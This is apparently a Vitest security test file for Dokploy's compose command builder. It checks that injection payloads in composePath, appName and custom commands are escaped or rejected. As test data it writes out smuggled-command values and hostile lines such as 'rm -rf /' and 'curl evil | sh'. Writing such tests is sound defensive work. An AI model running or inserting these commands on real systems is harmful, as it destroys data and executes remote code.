import { existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createCommand } from "@dokploy/server/utils/builders/compose";
import { parse, quote } from "shell-quote";
import { describe, expect, it } from "vitest";
import {
	boundedSh,
	boundedShellAvailable,
	makeTempDir,
} from "./helpers/bounded-shell";

// A path node and sh read the same way: on Windows, `/tmp` of Git Bash is the
// user's temp directory while node reads it as C:/tmp, so a `/tmp` marker
// could never be seen. Forward slashes work in both.
const MARK = join(
	makeTempDir(join(tmpdir(), "dokploy-compose-inject-")),
	"pwned",
).replace(/\\/g, "/");
// The marker as shell text: a temp directory may contain a space.
const Q_MARK = quote([MARK]);

const base = {
	composeType: "docker-compose" as const,
	appName: "compose-app",
	sourceType: "raw" as const,
	command: "",
	composePath: "docker-compose.yml",
};

// createCommand output is interpolated as `docker ${command}` at the deploy
// sink; run `: ${command}` (docker -> no-op) and assert no injection fires.
// A missing marker only means something when the shell ran to the end: a
// launcher failure, a non-zero exit or the bound firing fails the check.
const runsSafely = (command: string, timeout = 30_000) => {
	if (existsSync(MARK)) rmSync(MARK);
	const result = boundedSh(["-c", `: ${command}`], {
		encoding: "utf8",
		stdio: "ignore",
		timeout,
	});
	const fired = existsSync(MARK);
	if (existsSync(MARK)) rmSync(MARK);
	if (result.error || result.status !== 0 || result.signal !== null) {
		throw new Error(
			`The shell did not complete (status ${result.status}, signal ${result.signal}${result.error ? `, ${result.error.message}` : ""}): an absent marker proves nothing.`,
		);
	}
	return !fired;
};

// The payloads run in a real (bounded) shell: skipped where there is no `timeout`.
const itWithShell = boundedShellAvailable ? it : it.skip;

const PAYLOADS = [
	`$(touch ${Q_MARK})`,
	`\`touch ${Q_MARK}\``,
	`x; touch ${Q_MARK}`,
	`x | touch ${Q_MARK}`,
];

describe("compose createCommand injection", () => {
	// The check itself: it sees an injection that fires, and a shell that did
	// not finish cannot pass as safe.
	itWithShell("runsSafely detects a payload that runs", () => {
		expect(runsSafely(`x; touch ${Q_MARK}`)).toBe(false);
		expect(runsSafely("x")).toBe(true);
	});

	itWithShell("runsSafely fails when the shell exits non-zero", () => {
		expect(() => runsSafely("x; exit 3")).toThrow(/status 3/);
	});

	itWithShell(
		"runsSafely fails when the shell is stopped by its bound",
		() => {
			// Sleeps past a 1 s bound; short enough that nothing outlives the test.
			expect(() => runsSafely("x; sleep 5", 1000)).toThrow(/did not complete/);
		},
		30_000,
	);

	itWithShell("escapes composePath (docker-compose)", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				sourceType: "github",
				composePath: p,
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	itWithShell("escapes composePath (stack deploy)", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				composeType: "stack",
				sourceType: "github",
				composePath: p,
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	itWithShell("escapes appName", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				sourceType: "github",
				appName: p,
				composePath: "docker-compose.yml",
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	it("rejects a custom command containing shell control characters", () => {
		for (const bad of [
			"up -d; rm -rf /",
			"up && curl evil | sh",
			"up $(touch x)",
			"up `id`",
		]) {
			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
				/Invalid characters/,
			);
		}
	});

	it("allows a legitimate custom command", () => {
		const cmd = createCommand({
			...base,
			command: "compose -f docker-compose.yml -p app up -d --build",
		} as any);
		expect(cmd).toBe("compose -f docker-compose.yml -p app up -d --build");
	});

	it("keeps a legitimate composePath intact", () => {
		const cmd = createCommand({
			...base,
			sourceType: "github",
			composePath: "deploy/docker-compose.prod.yml",
		} as any);
		expect(parse(cmd)).toContain("deploy/docker-compose.prod.yml");
		expect(quote(["deploy/docker-compose.prod.yml"])).toBe(
			"deploy/docker-compose.prod.yml",
		);
	});

	it("allows chained docker compose commands with '&&'", () => {
		const cmd = createCommand({
			...base,
			command:
				"compose pull && docker compose down && docker compose up -d --build",
		} as any);
		expect(cmd).toBe(
			"compose pull && docker compose down && docker compose up -d --build",
		);
	});

	it("allows chaining with the legacy 'docker-compose' spelling", () => {
		const cmd = createCommand({
			...base,
			command: "compose pull && docker-compose down",
		} as any);
		expect(cmd).toBe("compose pull && docker-compose down");
	});

	it("rejects a single '&' used for backgrounding", () => {
		expect(() =>
			createCommand({ ...base, command: "compose up -d & sleep 1" } as any),
		).toThrow(/Single '&' is not allowed/);
	});

	it("rejects a malformed '&&&' chain", () => {
		expect(() =>
			createCommand({
				...base,
				command: "compose pull &&& docker compose up -d",
			} as any),
		).toThrow(/Single '&' is not allowed/);
	});

	it("rejects chained segments that are not docker compose invocations", () => {
		expect(() =>
			createCommand({
				...base,
				command: "compose pull && rm -rf /",
			} as any),
		).toThrow(/must strictly start with 'docker compose '/);
	});

	it("rejects an attempted injection smuggled inside a chained segment", () => {
		for (const bad of [
			"compose pull && docker compose up -d; touch /tmp/pwn",
			"compose pull && docker compose up -d $(touch /tmp/pwn)",
			"compose pull && docker compose up -d `touch /tmp/pwn`",
			"compose pull && docker compose up -d | touch /tmp/pwn",
		]) {
			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
				/Invalid characters/,
			);
		}
	});

	it("rejects a chain that only pretends to start with docker compose later in the string", () => {
		expect(() =>
			createCommand({
				...base,
				command: "compose pull && curl evil.sh | docker compose up -d",
			} as any),
		).toThrow(/Invalid characters/);
	});
});
